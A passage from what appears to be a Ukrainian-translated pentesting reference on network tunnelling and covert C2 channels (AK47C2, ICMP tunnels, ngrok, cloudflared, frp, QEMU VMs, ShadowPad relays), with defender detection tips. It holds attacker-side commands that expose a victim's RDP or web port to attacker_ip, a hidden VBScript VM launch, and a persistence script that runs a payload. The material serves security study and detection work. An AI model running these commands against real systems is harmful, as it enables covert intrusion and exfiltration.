[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Кастомний DNS TXT / HTTP JSON C2 (AK47C2)

Актор Storm-2603 створив **двоканальний C2 («AK47C2»)**, який використовує *лише* вихідний трафік **DNS** і **звичайні HTTP POST** — два протоколи, які рідко блокуються в корпоративних мережах.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Генерує випадковий 5-символьний SessionID (наприклад, `H4T14`).
• Додає `1` для *запитів завдань* або `2` для *результатів* і об'єднує різні поля (прапорці, SessionID, ім'я комп'ютера).
• Кожне поле **шифрується за допомогою XOR з ASCII-ключем `VHBD@H`**, кодується в hex і об'єднується крапками — зрештою додається контрольований атакувальником домен:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Для запитів використовується `DnsQuery()` для записів **TXT** (і fallback **MG**).
• Коли відповідь перевищує 0xFF байтів, backdoor **фрагментує** дані на частини по 63 байти та вставляє маркери:
`s<SessionID>t<TOTAL>p<POS>`, щоб C2-сервер міг відновити їхній порядок.

2. **HTTP mode (AK47HTTP)**
• Формує JSON-конверт:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Увесь blob перетворюється за схемою XOR-`VHBD@H` → hex → надсилається як тіло **`POST /`** із заголовком `Content-Type: text/plain`.
• Відповідь використовує те саме кодування, а поле `cmd` виконується за допомогою `cmd.exe /c <command> 2>&1`.

Нотатки Blue Team
• Шукайте незвичні **TXT-запити**, перший label яких містить довгий hex і які завжди закінчуються одним рідкісним доменом.
• Сталий XOR-ключ, за яким іде ASCII-hex, легко виявити за допомогою YARA: `6?56484244?484` (`VHBD@H` у hex).
• Для HTTP виявляйте тіла POST із `text/plain`, які містять лише hex і мають кількість байтів, кратну двом.

{{#note}}
Канал зберігає кожен sub-domain label у межах ліміту DNS у 63 октети, але відповідність протоколу сама по собі не робить його непомітним; рідкісні домени, довгі hex-labels і обсяг запитів залишаються ознаками для виявлення.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP-тунелювання

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans описує IPv4-over-ICMP tunnel із використанням TUN-пристрою та ICMP echo requests; налаштування вимагає привілеїв, достатніх для створення інтерфейсу.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Завантажте його звідси**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng передає TCP-з'єднання через ICMP і використовує наведені нижче параметри `-p`, `-l`, `-r` та `-R` для proxy, локального listener, хоста призначення та порту призначення відповідно.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) — це агент для публікації локальних мережевих служб в Інтернеті через захищений тунель; його CLI документує кінцеві точки HTTP, TCP і file URL, а надруковане ім’я хоста кінцевої точки може відрізнятися залежно від кінцевої точки та облікового запису.<sup>[[39]](#references)</sup>

### Встановлення

- Створіть обліковий запис: https://ngrok.com/signup
- Завантаження клієнта:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Базове використання

**Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Агент також підтримує параметри автентифікації та TLS за потреби.<sup>[[39]](#references)</sup>_

#### Тунелювання TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Надання доступу до файлів через HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Корисно для XSS,SSRF,SSTI ..._\
Standalone agent за замовчуванням надає інтерфейс перевірки HTTP за адресою `http://127.0.0.1:4040`; інтерфейс призначений для HTTP-трафіку.<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

Опція `--host-header=rewrite` переписує upstream HTTP-заголовок `Host` відповідно до локального сервісу.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Простий приклад конфігурації ngrok.yaml

У цьому прикладі використовується ngrok Agent Config v2; іменовані тунелі використовують `proto` та `addr` і запускаються за допомогою `ngrok start`.<sup>[[42]](#references)</sup> Він відкриває 3 тунелі:

- 2 TCP
- 1 HTTP зі статичними файлами з `/tmp/httpbin/`
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Конектор `cloudflared` у Cloudflare Tunnel встановлює вихідні з'єднання; опубліковані застосунки можуть маршрутизувати HTTP, HTTPS, TCP, SSH і RDP, тоді як quick tunnels призначені для розробки HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Однорядкова команда quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Походження SOCKS5 (застарілий режим)

Застарілий прапорець `--socks5` повідомляє `cloudflared`, що локальний origin працює через SOCKS5; він не створює локальний слухач SOCKS5. Для керованого тунелю `originRequest.proxyType: socks` налаштовує обробку origin через SOCKS5.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Постійні тунелі через DNS

Конфігурація тунелю, керованого локально, використовує ключі `tunnel`, `credentials-file` і `url` у нижньому регістрі, як показано нижче.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Запустіть конектор:
```bash
cloudflared tunnel run mytunnel
```
Конектор встановлює вихідні з'єднання та, за замовчуванням, узгоджує QUIC із fallback до HTTP/2; не припускайте, що кожне розгортання використовує TCP/443. Запускайте його лише з привілеями, необхідними для вашого розгортання.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) — це reverse proxy на Go, який підтримує **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX і XTCP**. XTCP використовує P2P hole punching, успіх якого залежить від NAT. Починаючи з **v0.53.0**, він може працювати як **SSH Tunnel Gateway**, тож цільовий хост може використовувати стандартний клієнт OpenSSH без бінарного файлу `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Класичний reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Використання нового SSH-шлюзу (без бінарного файлу frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Наведена вище команда публікує порт жертви **8080** як **attacker_ip:9000**, використовуючи стандартний клієнт OpenSSH, тоді як `frps` надає gateway.<sup>[[50]](#references)</sup>

## Приховані тунелі на базі VM з QEMU

Мережа в режимі користувача QEMU не потребує root або адміністративних привілеїв для віртуальної мережі, а `-netdev user,hostfwd=...` перенаправляє TCP-, UDP- або UNIX-з'єднання з host до guest.<sup>[[51]](#references)</sup> TrustedSec задокументувала Tiny Core QEMU VM і спробу reverse SSH tunnel під час інциденту, коли EDR, орієнтований на host, міг не помітити активність усередині guest.<sup>[[1]](#references)</sup>

### Швидкий однорядковий варіант
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Наведена вище команда запускає гостьову систему **Tiny Core Linux** із 256 MiB гостьової пам’яті та дисковим образом qcow2; дисковий образ не є диском у RAM.
• Порт **2222/tcp** на Windows-хості прозоро перенаправляється на **22/tcp** усередині гостьової системи.
• З точки зору атакувальника ціль просто відкриває порт 2222; усі пакети, що до нього надходять, обробляються SSH-сервером, запущеним у VM.

### Stealthy запуск через VBScript

TrustedSec спостерігала запуски QEMU, керовані через VBS, і використання образів Tiny Core в описаному вище інциденті.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Запуск скрипта с помощью `cscript.exe //B update.vbs` зберігає вікно прихованим.<sup>[[1]](#references)</sup>

### Persistence у guest

У наведеному інциденті описано persistence у stateless guest Tiny Core через `/opt/bootlocal.sh` і `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Записати payload до `/opt/123.out`
2. Додати до `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Додати `home/tc` і `opt` до `/opt/filetool.lst`, щоб під час завершення роботи payload було запаковано до `mydata.tgz`.

### Міркування щодо telemetry

• На host усе ще видно процес QEMU, образ qcow2 і будь-який listener, прокинутий через host.
• Сканування процесів лише на host може не перевіряти процеси guest, але virtualization не гарантує evasion; network-, QEMU- і image telemetry усе одно можуть його виявити.<sup>[[1]](#references)[[51]](#references)</sup>

### Поради для defenders

• Створюйте alert на **неочікувані бінарні файли QEMU/VirtualBox/KVM** у шляхах, доступних для запису користувачам.
• Блокуйте outbound connections, що походять від `qemu-system*.exe`.
• Шукайте рідкісні listening ports (2222, 10022, …), які починають прослуховуватися одразу після запуску QEMU.

## Relay nodes IIS/HTTP.sys через `HttpAddUrl` (ShadowPad)

Check Point описує IIS module ShadowPad як такий, що перетворює скомпрометовані perimeter web servers на backdoor і relay nodes, прив’язуючи URL prefixes через `HttpAddUrl`.<sup>[[3]](#references)</sup>

У цьому ж звіті детально описано defaults, wildcard listeners, packet decryption, relay queues і debug telemetry, узагальнені нижче.<sup>[[3]](#references)</sup>

* **Config defaults** – якщо JSON config module не містить значень, він використовує правдоподібні IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Завдяки цьому на benign traffic IIS відповідає з правильною branding.
* **Wildcard interception** – operators передають розділений крапками з комою список URL prefixes (wildcards у host + path). Module викликає `HttpAddUrl` для кожного запису, тому HTTP.sys маршрутизує matching requests до malicious handler; nonmatching requests повертаються до стандартної поведінки IIS.
* **Encrypted first packet** – перші два байти request body містять seed для custom 32-bit PRNG. Кожен наступний байт перед protocol parsing обробляється операцією XOR із generated keystream:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module підтримує два списки: “servers” (upstream nodes) і “clients” (downstream implants). Entries видаляються, якщо heartbeat не надходить протягом приблизно 30 секунд. Коли обидва списки не порожні, він об’єднує перший healthy server із першим healthy client і просто передає байти між їхніми sockets, доки одна зі сторін не закриється.
* **Debug telemetry** – optional logging записує source IP, destination IP і загальну кількість forwarded bytes для кожного pairing. Investigators використали ці breadcrumbs, щоб відновити ShadowPad mesh, що охоплювала кілька victims.

---

## Інші tools для перевірки

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Приховування в тінях: Covert Tunnels через QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – До ToolShell: дослідження попередніх ransomware operations Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Всередині Ink Dragon: розкриття Relay Network і внутрішньої роботи Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Довідник Nmap: обхід обмежень Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Посібник OpenBSD ssh](https://man.openbsd.org/ssh)
- [7] [Посібник OpenBSD sshd_config](https://man.openbsd.org/sshd_config)
- [8] [Примітки до випуску OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting у Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Документація Metasploit socks_proxy module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Документація Metasploit autoroute module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Посібник socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Посібник PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Опції командного рядка PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Команда Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Документація Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Правила Proxification Rules у Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Посібник OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: доменні імена – реалізація та специфікація](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [Інтерфейс веб-інспекції ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Віртуальні hosts ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Конфігурація ngrok Agent v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Огляд Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Параметри origin Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Налаштування Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Файл конфігурації Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Параметри запуску Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Концепції frp](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Документація щодо networking у QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Репозиторій вихідного коду NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet за CDN із BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
